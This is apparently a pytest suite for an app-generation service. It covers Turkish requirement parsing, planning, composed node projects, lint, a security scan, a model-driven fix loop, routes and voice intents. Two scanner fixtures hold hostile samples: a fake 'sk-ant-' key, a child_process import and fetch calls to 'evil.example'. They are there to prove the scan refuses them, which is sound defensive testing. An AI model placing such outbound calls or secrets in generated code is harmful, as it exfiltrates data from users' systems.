"""B40 - the App Factory past its three templates (req 422-439).

Measured before: the requirements parser read a template word and a name and dropped the
rest of the owner's sentence in silence; no architecture or project planner existed;
``ClaudeAppGenerator`` raised unconditionally; a project was one template's fixed files;
no database, API, auth or test generation; no failed-test analysis, no fix, no loop, no
lint, no security scan of generated code.

Every seam is proven by executing it: the parser on Turkish sentences, the planners, the
composer's files validated and RUN under the real node (the generated unit and
integration suites pass), the lint and the scan on hostile files, the model seam through
a scripted model, the fix loop on a device whose tests fail then pass, the service and
the routes through the real application object, the voice tool through the harness.
"""

from __future__ import annotations

import json
import shutil
import subprocess
import uuid
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import select

from app.appfactory import composed_service, planner, requirements
from app.appfactory.appsecurity import scan_files
from app.appfactory.code_model import (
    CodeModelError,
    ModelAssistedGenerator,
    ScriptedCodeModel,
)
from app.appfactory.composer import TEMPLATE_COMPOSED, ComposedAppGenerator, slugify
from app.appfactory.fixloop import MAX_FIX_ATTEMPTS, analyze_failures
from app.appfactory.generator import ProjectFile, ProjectFiles
from app.appfactory.lint import lint_files
from app.appfactory.models import STATE_FAILED, STATE_TESTED, AppProjectRow
from app.appfactory.service import AppFactoryService
from app.appfactory.spec import AppSpec
from app.appfactory.validation import AppValidationError, validate
from app.ledger.models import ActivityEventRow
from app.routines.dispatch import DeviceRunResult
from app.selfdev.security_review import CHECK_NETWORK
from app.voice.intents import Intent, resolve_intent
from tests.alarms_support import FakeDeviceAction
from tests.appfactory_support import appfactory_capability_results
from tests.voice_corpus.harness import build_harness

NODE = shutil.which("node") or r"C:\Program Files\nodejs\node.exe"
SENTENCE = (
    "Bana müşterileri ve siparişleri tutan, girişli bir uygulama yap: müşteri adı, telefon; "
    "sipariş tutarı, tarih, ödendi mi"
)
API_ONLY = "Sadece api olan, notları tutan bir servis yap: başlık, içerik"


def _node_available() -> bool:
    return Path(NODE).exists()


# --------------------------------------------------------------- the parser (422)


def test_the_parser_reads_kinds_fields_types_and_the_login_and_names_what_it_could_not() -> None:
    req = requirements.parse_requirements(SENTENCE)
    assert [e.name for e in req.entities] == ["müşteri", "sipariş"]
    assert [(f.name, f.type) for f in req.entities[0].fields] == [
        ("ad", "text"),
        ("telefon", "text"),
    ]
    assert [(f.name, f.type) for f in req.entities[1].fields] == [
        ("tutar", "number"),
        ("tarih", "date"),
        ("ödendi", "boolean"),
    ]
    assert req.wants_auth and req.wants_frontend and req.unparsed == []
    named = requirements.parse_requirements(
        "Kitaplarımı listeleyen bir uygulama oluştur, adı Kitaplık: kitap adı, yazar"
    )
    assert named.name == "Kitaplık" and [e.name for e in named.entities] == ["kitap"]
    api_only = requirements.parse_requirements(API_ONLY)
    assert not api_only.wants_frontend and api_only.entities[0].name == "not"
    # Nothing readable is not silence: the parser says so.
    vague = requirements.parse_requirements("Bana güzel bir uygulama yap.")
    assert vague.entities == [] and vague.unparsed and vague.template_hint is None
    # The three built-in shapes keep their words.
    assert (
        requirements.parse_requirements("Bana bir görev takip uygulaması yap").template_hint
        == "task-tracker"
    )
    odd = requirements.parse_requirements(
        "Stokları tutan bir uygulama yap: ürün adı, adet; garip bir şey"
    )
    assert odd.unparsed == ["garip bir şey"]


# ------------------------------------------------------------- the planners (423, 424)


def test_the_planners_name_the_layers_with_reasons_and_the_files_in_order() -> None:
    req = requirements.parse_requirements(SENTENCE)
    arch = planner.plan_architecture(req)
    assert arch.runtime == "node" and arch.storage == "json-file" and arch.auth and arch.frontend
    assert arch.layers == ["schema", "store", "api", "auth", "frontend", "tests"]
    assert any("stdlib-only" in r for r in arch.rationale)
    plan = planner.plan_project(arch)
    paths = plan.paths()
    assert paths.index("schema.js") < paths.index("store.js") < paths.index("server.js")
    assert (
        "auth.js" in paths and "public/index.html" in paths and "tests/browser-oracle.json" in paths
    )
    assert plan.run_command == "node server.js" and plan.test_command == "node tests/run.js"
    assert not any(f.author == "model" for f in plan.files)
    with_slots = planner.plan_project(arch, model_slots=True)
    assert [f.path for f in with_slots.files if f.author == "model"] == list(
        planner.MODEL_SLOT_PATHS
    )
    api_only = planner.plan_architecture(requirements.parse_requirements(API_ONLY))
    assert not api_only.frontend and "frontend" not in api_only.layers


# ------------------------------------------------- the composer, validated and RUN (425-434)


def _compose(sentence: str, **kwargs: Any):
    req = requirements.parse_requirements(sentence)
    arch = planner.plan_architecture(req)
    plan = planner.plan_project(arch, **kwargs)
    files = ComposedAppGenerator().generate_from_plan(
        app_name=req.name or "Deneme", arch=arch, plan=plan
    )
    return req, arch, plan, files


def _run_under_node(files: ProjectFiles, tmp_path: Path) -> subprocess.CompletedProcess[str]:
    for entry in files.files:
        target = tmp_path / entry.path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(entry.text, encoding="utf-8")
        if entry.path.endswith(".js"):
            check = subprocess.run(
                [NODE, "--check", str(target)], capture_output=True, text=True, timeout=30
            )
            assert check.returncode == 0, (entry.path, check.stderr[:300])
    return subprocess.run(
        [NODE, "tests/run.js"], cwd=tmp_path, capture_output=True, text=True, timeout=180
    )
@pytest.mark.skipif(not _node_available(), reason="node is not installed on this machine")
@pytest.mark.parametrize(
    "sentence",
    [
        SENTENCE,
        API_ONLY,
        "Kitaplarımı listeleyen bir uygulama oluştur: kitap adı, yazar, sayfa sayısı",
    ],
)
def test_a_composed_application_validates_lints_scans_and_its_generated_tests_pass_under_node(
    sentence: str, tmp_path: Path
) -> None:
    req, arch, plan, files = _compose(sentence)
    assert len(files) >= 8 and files.path_set() == set(plan.paths())
    _report, manifest = validate(files)
    assert manifest == {
        "entry": "server.js",
        "run": {"serve": "node server.js"},
        "test": {"unit": "node tests/run.js"},
        "port": arch.port,
    }
    assert lint_files(files).ok and scan_files(files).ok
    proc = _run_under_node(files, tmp_path)
    summary = proc.stdout.strip().splitlines()[-1] if proc.stdout.strip() else proc.stderr[:300]
    assert proc.returncode == 0, (summary, proc.stdout[-1500:], proc.stderr[:800])
    passed, total = summary.split(" ")[0].split("/")
    assert passed == total and int(total) >= 10
    schema = json.loads(files.get("schema.js").split("var ENTITIES = ", 1)[1].split(";\n", 1)[0])
    assert [e["name"] for e in schema] == [slugify(e.name) for e in req.entities]
    if arch.frontend:
        oracle = json.loads(files.get("tests/browser-oracle.json"))
        assert (
            oracle["template"] == TEMPLATE_COMPOSED
            and oracle["interaction_steps"][-1]["action"] == "assert_text"
        )
        assert 'lang="tr"' in files.get("public/index.html")
    else:
        assert files.get("public/index.html") is None


def test_the_composer_refuses_a_kind_or_field_with_no_identifier() -> None:
    from app.appfactory.generator import AppGeneratorError

    req = requirements.Requirements(
        sentence="x",
        entities=[requirements.EntitySpec(name="???", fields=[requirements.FieldSpec("ad")])],
        features=["database", "frontend"],
    )
    arch = planner.plan_architecture(req)
    with pytest.raises(AppGeneratorError, match="no usable identifier"):
        ComposedAppGenerator().generate_from_plan(
            app_name="x", arch=arch, plan=planner.plan_project(arch)
        )


# ------------------------------------------------------------ lint and scan (438, 439)


def test_the_lint_finds_the_shape_faults_and_the_scan_the_dangerous_ones() -> None:
    bad = ProjectFiles(
        files=(
            ProjectFile("a.js", "function f() {\n  return eval('1');\n"),
            ProjectFile("b.html", "<html><head></head><body><script></body></html>"),
            ProjectFile("c.json", "{not json"),
            ProjectFile("d.js", "var x = 1;\t\n"),
        )
    )
    report = lint_files(bad)
    messages = {(f.path, f.message) for f in report.errors}
    assert ("a.js", "'{' is never closed") in messages
    assert ("a.js", "eval() is not allowed") in messages
    assert ("b.html", "<html> needs a lang attribute") in messages
    assert ("b.html", "<head> needs a <meta charset>") in messages
    assert any(p == "c.json" and m.startswith("not JSON") for p, m in messages)
    assert ("d.js", "a tab character") in messages
    assert not report.ok and report.as_dict()["errors"] == len(report.errors)
    # A regex literal with a bracket inside is not an unbalanced bracket.
    fine = ProjectFiles(
        files=(ProjectFile("r.js", '"use strict";\nvar re = /^[(]+$/;\nvar s = "{";\n'),)
    )
    assert lint_files(fine).ok

    hostile = ProjectFiles(
        files=(
            ProjectFile(
                "evil.js",
                '"use strict";\nvar k = "sk-ant-" + "abcdefghijklmnopqrstuvwxyz";\nvar cp = require("child_process");\nfetch("https://evil.example/x");\n',
            ),
        )
    )
    scan = scan_files(hostile)
    assert not scan.ok
    checks = {f.check for f in scan.findings}
    assert CHECK_NETWORK in checks
    assert not lint_files(hostile).ok  # child_process is a lint error too


# ------------------------------------------------------------ the model seam (425)


def _custom_ok() -> dict[str, str]:
    return {
        "custom.js": (
            '"use strict";\n'
            "function toplam(rows) {\n"
            "  return rows.reduce(function (a, r) { return a + (r.tutar || 0); }, 0);\n"
            "}\n"
            "module.exports = { toplam: toplam };\n"
        ),
        "tests/custom.js": (
            '"use strict";\n'
            'var assert = require("assert");\n'
            'var custom = require("../custom.js");\n'
            "module.exports = function (check) {\n"
            '  check("toplam sums tutar", function () {\n'
            "    assert.strictEqual(custom.toplam([{ tutar: 2 }, { tutar: 3 }]), 5);\n"
            "  });\n"
            "};\n"
        ),
    }


@pytest.mark.skipif(not _node_available(), reason="node is not installed on this machine")
def test_the_model_fills_only_its_slots_under_the_flag_and_its_tests_run_with_the_rest(
    tmp_path: Path,
) -> None:
    model = ScriptedCodeModel(custom=_custom_ok())
    generator = ModelAssistedGenerator(model=model, enabled=True)
    req = requirements.parse_requirements(SENTENCE)
    arch = planner.plan_architecture(req)
    plan = planner.plan_project(arch, model_slots=True)
    files = generator.generate(app_name="Sipariş Defteri", req=req, arch=arch, plan=plan)
    assert generator.last_note == "model:scripted" and files.get("custom.js") is not None
    assert model.asked[0]["slots"] == list(planner.MODEL_SLOT_PATHS)
    proc = _run_under_node(files, tmp_path)
    assert proc.returncode == 0 and "ok - toplam sums tutar" in proc.stdout
    # Off the flag the model is never asked; a model that fails leaves the app whole.
    quiet = ModelAssistedGenerator(model=ScriptedCodeModel(custom=_custom_ok()), enabled=False)
    plain = quiet.generate(app_name="x", req=req, arch=arch, plan=planner.plan_project(arch))
    assert plain.get("custom.js") is None and quiet.last_note == "deterministic"
    failing = ModelAssistedGenerator(
        model=ScriptedCodeModel(fail_with="rate limited"), enabled=True
    )
    whole = failing.generate(app_name="x", req=req, arch=arch, plan=plan)
    assert whole.get("server.js") is not None and "model refused" in failing.last_note
    # A model that writes outside its slots is refused whole.
    outside = ScriptedCodeModel(custom={"server.js": "hacked"})
    with pytest.raises(CodeModelError, match="may not write"):
        outside.generate_custom(req, arch, plan)


def test_a_model_slot_with_network_egress_is_refused_before_the_device_sees_it() -> None:
    """Req 439: the scan gates the scaffold - a model that writes an outbound call never
    reaches the device, and the refusal names the file and the check."""
    h = build_harness()
    device = FakeDeviceAction(results=dict(appfactory_capability_results()))
    evil = {
        "custom.js": ('"use strict";\nfetch("https://evil.example/x");\nmodule.exports = {};\n'),
        "tests/custom.js": '"use strict";\nmodule.exports = function (check) {};\n',
    }
    service = AppFactoryService(
        composed=ModelAssistedGenerator(model=ScriptedCodeModel(custom=evil), enabled=True)
    )
    with h.factory() as db:
        answer = service.create(db, device, spec={"request": SENTENCE}, session_id="s")
    assert answer["execution_status"] == "refused", answer
    assert answer["code"] == "security_refused" and "custom.js" in answer["speech"]
    assert device.capabilities_called() == []


# ------------------------------------------------------ failure analysis + fix loop (435-437)


def test_failed_test_analysis_names_the_tests_and_the_files() -> None:
    analysis = analyze_failures(
        {
            "exit_code": 1,
            "passed": 3,
            "failed": 2,
            "report_tail": (
                "ok - a\nnot ok - toplam sums tutar :: expected 5 got 4 (custom.js)\n"
                "not ok - b :: boom\n3/5 passed"
            ),
        }
    )
    assert analysis.failed == 2 and analysis.passed == 3 and not analysis.crashed
    assert [f.name for f in analysis.failures] == ["toplam sums tutar", "b"]
    assert analysis.failures[0].file == "custom.js" and "2 test başarısız" in analysis.summary
    crashed = analyze_failures(
        {
            "exit_code": 1,
            "passed": 0,
            "failed": 0,
            "report_tail": "not ok - integration suite crashed :: EADDRINUSE",
        }
    )
    assert crashed.crashed and crashed.failures[0].name == "integration suite crashed"
    assert (
        analyze_failures({"exit_code": 0, "passed": 4, "failed": 0}).summary == "başarısız test yok"
    )


def _fix_device(*, fail_first_versions: int = 1) -> tuple[FakeDeviceAction, dict[str, int]]:
    """A device whose tests fail for the first N scaffolded versions and pass after."""
    seen = {"tests": 0}
    results = dict(appfactory_capability_results())

    def project_test(payload: dict[str, Any]) -> DeviceRunResult:
        seen["tests"] += 1
        if seen["tests"] <= fail_first_versions:
            return DeviceRunResult(
                True,
                result={
                    "exit_code": 1,
                    "passed": 20,
                    "failed": 1,
                    "report_tail": "not ok - toplam sums tutar :: expected 5 got 4",
                },
            )
        return DeviceRunResult(
            True, result={"exit_code": 0, "passed": 21, "failed": 0, "report_tail": "21/21 passed"}
        )

    results["project.test"] = project_test
    return FakeDeviceAction(results=results), seen


def test_the_fix_loop_diagnoses_fixes_scaffolds_a_new_version_and_stops_when_green() -> None:
    h = build_harness()
    device, seen = _fix_device(fail_first_versions=1)
    model = ScriptedCodeModel(custom=_custom_ok(), fixes=[_custom_ok()])
    service = AppFactoryService(
        composed=ModelAssistedGenerator(model=model, enabled=True), code_model=model
    )
    with h.factory() as db:
        created = service.create(
            db, device, spec={"request": SENTENCE, "name": "Sipariş Defteri"}, session_id="s"
        )
        assert created["execution_status"] == "executed", created
        assert (
            created["template"] == TEMPLATE_COMPOSED
            and created["reports"]["generation"] == "model:scripted"
        )
        project_id = created["project_id"]
        tested = service.test(db, device, target=project_id, session_id="s")
        assert tested["state"] == STATE_FAILED and tested["failed"] == 1
        fixed = service.fix(db, device, target=project_id, session_id="s")
        assert fixed["execution_status"] == "executed", fixed
        assert fixed["fix"]["status"] == "fixed" and fixed["version"] == 2
        assert fixed["analysis"]["failures"][0]["name"] == "toplam sums tutar"
        assert model.asked[-2]["op"] == "diagnose" and model.asked[-1]["op"] == "fix"
        latest = db.get(AppProjectRow, uuid.UUID(fixed["latest_project_id"]))
        assert (
            latest.version == 2
            and str(latest.parent_id) == project_id
            and latest.state == STATE_TESTED
        )
        scaffolds = [
            c["payload"]["slug"] for c in device.calls if c["capability"] == "project.scaffold"
        ]
        assert scaffolds[-1].endswith("-v2") and seen["tests"] == 2
        events = list(
            db.scalars(
                select(ActivityEventRow).where(ActivityEventRow.event_type == "app.project.fix")
            )
        )
        assert len(events) == 1 and events[0].detail_json["status"] == "fixed"
        # Green already: nothing to fix, said plainly.
        again = service.fix(db, device, target=fixed["latest_project_id"], session_id="s")
        assert again["fix"]["status"] == "not_needed"


def test_the_fix_loop_is_bounded_and_honest_without_a_model_or_with_the_same_failure() -> None:
    h = build_harness()
    device, _seen = _fix_device(fail_first_versions=99)
    no_model = AppFactoryService()
    with h.factory() as db:
        created = no_model.create(db, device, spec={"request": SENTENCE}, session_id="s")
        project_id = created["project_id"]
        no_model.test(db, device, target=project_id, session_id="s")
        answer = no_model.fix(db, device, target=project_id, session_id="s")
        assert answer["execution_status"] == "refused" and answer["fix"]["status"] == "no_model"
        assert (
            "kod modeli yapılandırılmamış" in answer["speech"]
            and "toplam sums tutar" in answer["speech"]
        )
        assert device.capabilities_called().count("project.scaffold") == 1

    device, seen = _fix_device(fail_first_versions=99)
    model = ScriptedCodeModel(custom=_custom_ok(), fixes=[_custom_ok(), _custom_ok(), _custom_ok()])
    service = AppFactoryService(
        composed=ModelAssistedGenerator(model=model, enabled=True), code_model=model
    )
    with h.factory() as db:
        created = service.create(db, device, spec={"request": SENTENCE}, session_id="s")
        service.test(db, device, target=created["project_id"], session_id="s")
        answer = service.fix(db, device, target=created["project_id"], session_id="s")
        # The same failure twice stops the loop before the attempt bound.
        assert answer["fix"]["status"] == "same_failure" and len(answer["fix"]["attempts"]) == 1
        assert seen["tests"] == 2 and MAX_FIX_ATTEMPTS == 3


# ------------------------------------------------------- the service, the routes, the voice


def test_a_sentence_no_template_serves_becomes_a_composed_project_and_a_vague_one_a_question() -> (
    None
):
    h = build_harness()
    device = FakeDeviceAction(results=dict(appfactory_capability_results()))
    service = AppFactoryService()
    with h.factory() as db:
        vague = service.create(
            db, device, spec={"request": "Bana güzel bir uygulama yap."}, session_id="s"
        )
        assert (
            vague["execution_status"] == "refused"
            and vague["error_class"] == "clarification_needed"
        )
        assert "Hangi kayıtları" in vague["speech"] and device.capabilities_called() == []
        created = service.create(
            db, device, spec={"request": SENTENCE + "; renkli olsun"}, session_id="s"
        )
        assert created["execution_status"] == "executed"
        assert "renkli olsun" in created["speech"] and "anlayamadım" in created["speech"]
        row = db.get(AppProjectRow, uuid.UUID(created["project_id"]))
        assert row.template == TEMPLATE_COMPOSED and row.kind == "web_api"
        assert (
            row.plan_json["entry"] == "server.js"
            and row.oracle_json["template"] == TEMPLATE_COMPOSED
        )
        assert row.reports_json["lint"]["ok"] and row.reports_json["security"]["ok"]
        assert (
            AppSpec.model_validate(row.spec_json).requirements["entities"][0]["name"] == "müşteri"
        )
        payload = device.payload_for("project.scaffold")
        assert (
            payload["manifest"]["run"] == {"serve": "node server.js"}
            and len(payload["files"]) >= 12
        )
        # The three templates are untouched.
        tracker = service.create(
            db,
            device,
            spec={"name": "Yapılacaklar", "kind": "web_static", "template": "task-tracker"},
            session_id="s",
        )
        assert tracker["execution_status"] == "executed" and tracker["reports"] is None


def test_the_validator_admits_only_the_manifests_own_entry_for_node() -> None:
    files = ProjectFiles(
        files=(
            ProjectFile("server.js", '"use strict";\n'),
            ProjectFile("other.js", '"use strict";\n'),
            ProjectFile(
                "manifest.json",
                json.dumps({"entry": "server.js", "run": {"serve": "node other.js"}, "port": 8766}),
            ),
        )
    )
    with pytest.raises(AppValidationError, match="not on the allowlist"):
        validate(files)


def test_the_plan_route_previews_and_the_fix_route_acts_through_the_application() -> None:
    h = build_harness()
    preview = h.client.post("/v1/apps/plan", json={"text": SENTENCE})
    assert preview.status_code == 200, preview.text
    body = preview.json()
    assert body["architecture"]["auth"] is True and body["project"]["entry"] == "server.js"
    assert body["speech"].startswith("Planım şu") and "giriş korumalı" in body["speech"]
    vague = h.client.post("/v1/apps/plan", json={"text": "Bana güzel bir uygulama yap."}).json()
    assert vague["project"] is None and "anlayamadım" in vague["speech"]
    assert h.client.post("/v1/apps/plan", json={}).status_code == 422
    # fix on a project that was never tested is refused with the reason.
    with h.factory() as db:
        created = h.app_factory.create(db, h.device, spec={"request": SENTENCE}, session_id="s")
    refused = h.client.post(f"/v1/apps/{created['project_id']}/fix")
    assert refused.status_code == 422 and "Önce testleri" in refused.json()["detail"]["message"]
    assert h.client.get("/v1/apps").json()["projects"][0]["version"] == 1


@pytest.mark.parametrize(
    ("text", "intent", "request_kept"),
    [
        (SENTENCE, Intent.APP_FACTORY_CREATE, True),
        ("Bana bir görev takip uygulaması yap.", Intent.APP_FACTORY_CREATE, False),
        ("Testleri düzelt.", Intent.APP_FACTORY_FIX, False),
        ("Uygulamadaki hatayı düzelt.", Intent.APP_FACTORY_FIX, False),
        ("Testleri çalıştır.", Intent.APP_FACTORY_TEST, False),
        # Neighbours keep what was theirs.
        ("Şu bug'ı kendin düzelt.", Intent.SELFDEV_FIX, False),
        ("Bunu düzelt.", Intent.MEMORY_CORRECT, False),
    ],
)
def test_the_router_keeps_the_owners_sentence_and_knows_the_fix_word(
    text: str, intent: Intent, request_kept: bool
) -> None:
    resolved = resolve_intent(text)
    assert resolved.intent is intent, (text, resolved.intent, resolved.matched)
    assert (resolved.app_request == text.strip()) is request_kept


def test_the_voice_tool_plans_the_owners_words_and_the_fix_tool_is_registered() -> None:
    from app.security.step_up import TIER_SENSITIVE, tier_of
    from app.voice.realtime_sessions.tools import default_registry

    assert "app.fix" in set(default_registry().names()) and tier_of("app.fix") == TIER_SENSITIVE
    h = build_harness()
    sid = h.new_session()
    said = h.say(sid, SENTENCE)
    assert said["resolved_intents"][-1]["intent"] == "app_factory_create"
    call = h.tool(sid, "c-1", "app.create", {"content": "the model's paraphrase"})
    assert call["status"] == "succeeded", call
    body = call["result"]
    assert body["execution_status"] == "executed" and body["template"] == TEMPLATE_COMPOSED
    assert body["reports"]["requirements"]["sentence"] == SENTENCE
    assert h.device.capabilities_called() == ["project.scaffold"]
    fix = h.tool(sid, "c-2", "app.fix", {})
    assert (
        fix["result"]["execution_status"] == "refused"
        and "Önce testleri" in fix["result"]["speech"]
    )


def test_composed_spec_round_trips_and_a_composed_spec_needs_a_kind() -> None:
    req = requirements.parse_requirements(SENTENCE)
    spec = composed_service.composed_spec({"name": "Defter"}, req)
    assert spec.template == TEMPLATE_COMPOSED and spec.kind == "web_api" and spec.slug() == "defter"
    again = composed_service.requirements_from_spec(spec.model_dump(mode="json"))
    assert [e.name for e in again.entities] == ["müşteri", "sipariş"] and again.wants_auth
    with pytest.raises(ValueError, match="at least one record kind"):
        AppSpec.model_validate(
            {
                "name": "x",
                "kind": "web_api",
                "template": "composed",
                "requirements": {"entities": []},
            }
        )
    with pytest.raises(ValueError):
        AppSpec.model_validate(
            {
                "name": "x",
                "kind": "web_static",
                "template": "composed",
                "requirements": req.as_dict(),
            }
        )
